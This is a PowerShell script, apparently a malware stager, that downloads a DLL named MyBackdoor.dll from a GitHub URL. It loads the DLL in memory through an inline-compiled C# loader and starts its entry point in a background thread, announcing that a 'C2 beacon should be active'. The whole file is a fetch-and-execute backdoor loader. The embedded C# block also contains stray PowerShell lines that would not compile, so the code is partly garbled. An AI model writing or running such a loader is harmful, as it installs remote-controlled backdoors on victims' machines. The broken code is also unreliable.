# loader.ps1 - Managed Assembly Loader
if ([Environment]::Is64BitProcess) {
    Write-Host "[*] Running in 64-bit PowerShell"
} else {
    Write-Host "[!] Running in 32-bit PowerShell - may cause issues"
}
Write-Host "[*] Running under: $((Get-Host).Version) / $($PSVersionTable.PSEdition)"

# 1) Download the assembly bytes with error handling
$payloadUrl = 'https://raw.githubusercontent.com/concentratedsulfuricacid/vector/main/MyBackdoor.dll'
Write-Host "[*] Downloading managed payload from $payloadUrl"
try {
    $dllBytes = (New-Object Net.WebClient).DownloadData($payloadUrl)
    Write-Host "[*] Downloaded $($dllBytes.Length) bytes"
} catch {
    Write-Error "Download failed: $_"
    exit 1
}

# 2) Validate payload format
Write-Host "[*] Validating payload format..."
if ($dllBytes[0] -eq 0x4D -and $dllBytes[1] -eq 0x5A) {
    Write-Host "[*] Valid PE header detected"
} else {
    Write-Error "Invalid PE format - expected managed assembly"
    exit 1
}

# 3) Compile the managed assembly loader
Write-Host "[*] Compiling ManagedLoader for x64"
$compilerParams = New-Object System.CodeDom.Compiler.CompilerParameters
$compilerParams.GenerateInMemory = $true
$compilerParams.CompilerOptions = "/platform:x64"
$compilerParams.ReferencedAssemblies.Add("System.dll")
$compilerParams.ReferencedAssemblies.Add("System.Runtime.dll")

Add-Type -Language CSharp -CompilerParameters $compilerParams -TypeDefinition @"
using System;
using System.Reflection;
using System.Threading;
public static class ManagedLoader {
    public static void LoadAndExecute(byte[] assemblyBytes) {
        try {
            // Load the managed assembly
            Assembly asm = Assembly.Load(assemblyBytes);
            Write-Host "[*] Inspecting payload assembly types…"
            $types = $asm.GetTypes()
            foreach ($t in $types) {
                Write-Host "    $($t.FullName)"
            }
            Console.WriteLine("[*] Assembly loaded successfully");
            
            // Find the Entry type and Start method from your C# payload
            Type entryType = asm.GetType("MyBackdoor.Entry");
            if (entryType == null) {
                throw new Exception("MyBackdoor.Entry type not found in assembly");
            }
            Console.WriteLine("[*] Found Entry type");
            
            MethodInfo startMethod = entryType.GetMethod("Start", BindingFlags.Public | BindingFlags.Static);
            if (startMethod == null) {
                throw new Exception("Start method not found in Entry type");
            }
            Console.WriteLine("[*] Found Start method");
            
            // Execute the Start method in a separate thread to prevent blocking
            Thread executionThread = new Thread(() => {
                try {
                    Console.WriteLine("[*] Invoking Start method...");
                    startMethod.Invoke(null, null);
                } catch (Exception ex) {
                    Console.WriteLine("[!] Execution thread error: " + ex.Message);
                }
            });
            
            executionThread.IsBackground = true;
            executionThread.Start();
            
            Console.WriteLine("[*] Payload thread started successfully");
            
        } catch (Exception ex) {
            throw new Exception("Assembly execution failed: " + ex.Message);
        }
    }
}
"@

# 4) Execute the managed payload
Write-Host "[*] Loading managed C# assembly"
try {
    [ManagedLoader]::LoadAndExecute($dllBytes)
    Write-Host "[*] Payload deployed successfully"
    Write-Host "[*] C2 beacon should be active - check your console"
    
    # Keep the loader alive briefly to allow payload initialization
    Start-Sleep -Seconds 3
    Write-Host "[*] Loader complete - payload running independently"
    
} catch {
    Write-Error "Execution failed: $_"
    exit 1
}
